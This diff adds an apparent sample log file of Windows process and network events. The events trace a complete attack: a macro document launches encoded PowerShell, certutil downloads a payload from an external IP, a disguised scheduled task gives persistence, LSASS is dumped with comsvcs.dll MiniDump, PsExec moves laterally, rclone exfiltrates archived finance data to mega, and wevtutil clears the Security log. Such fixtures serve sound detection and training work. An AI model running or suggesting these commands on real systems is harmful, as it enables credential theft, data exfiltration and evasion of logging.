@@ -1,0 +1,16 @@
+2026-09-28T08:12:03Z host=WKS-042 EventID=1 Image=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE CommandLine="WINWORD.EXE /n C:\Users\j.martin\Downloads\Facture_0923.docm" User=CORP\j.martin
+2026-09-28T08:12:19Z host=WKS-042 EventID=1 ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" User=CORP\j.martin
+2026-09-28T08:12:22Z host=WKS-042 EventID=3 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp=185.220.101.47 DestinationPort=443 DestinationHostname=cdn-update-check.xyz
+2026-09-28T08:13:05Z host=WKS-042 EventID=1 Image=C:\Windows\System32\certutil.exe CommandLine="certutil -urlcache -split -f http://185.220.101.47/p/svchost.exe C:\Users\Public\svchost.exe"
+2026-09-28T08:13:40Z host=WKS-042 EventID=1 Image=C:\Users\Public\svchost.exe CommandLine="C:\Users\Public\svchost.exe" Hashes=SHA256=9f2b6c1e4a7d0b3c8e5f1a2d4c6b8e0f3a5c7d9e1b2f4a6c8d0e2f4b6a8c0d2e
+2026-09-28T08:14:02Z host=WKS-042 EventID=1 Image=C:\Windows\System32\schtasks.exe CommandLine="schtasks /create /sc onlogon /tn \"OneDrive Sync Update\" /tr C:\Users\Public\svchost.exe /rl highest /f"
+2026-09-28T08:15:11Z host=WKS-042 EventID=1 Image=C:\Windows\System32\whoami.exe CommandLine="whoami /all"
+2026-09-28T08:15:14Z host=WKS-042 EventID=1 Image=C:\Windows\System32\nltest.exe CommandLine="nltest /domain_trusts"
+2026-09-28T08:15:20Z host=WKS-042 EventID=1 Image=C:\Windows\System32\net.exe CommandLine="net group \"Domain Admins\" /domain"
+2026-09-28T08:21:47Z host=WKS-042 EventID=10 SourceImage=C:\Users\Public\svchost.exe TargetImage=C:\Windows\system32\lsass.exe GrantedAccess=0x1010
+2026-09-28T08:22:30Z host=WKS-042 EventID=1 Image=C:\Windows\System32\rundll32.exe CommandLine="rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Public\lsass.dmp full"
+2026-09-28T08:31:02Z host=SRV-FILE01 EventID=4624 LogonType=3 TargetUserName=adm.backup IpAddress=10.20.4.42 AuthenticationPackage=NTLM
+2026-09-28T08:31:05Z host=SRV-FILE01 EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\PSEXESVC.exe
+2026-09-28T08:40:12Z host=WKS-042 EventID=1 Image=C:\Program Files\7-Zip\7z.exe CommandLine="7z.exe a -pInfected2026 C:\Users\Public\data.7z \\SRV-FILE01\Finance$\*"
+2026-09-28T08:44:55Z host=WKS-042 EventID=1 Image=C:\Users\Public\rclone.exe CommandLine="rclone.exe copy C:\Users\Public\data.7z mega:backup --config C:\Users\Public\rc.conf"
+2026-09-28T08:52:10Z host=WKS-042 EventID=1 Image=C:\Windows\System32\wevtutil.exe CommandLine="wevtutil cl Security"
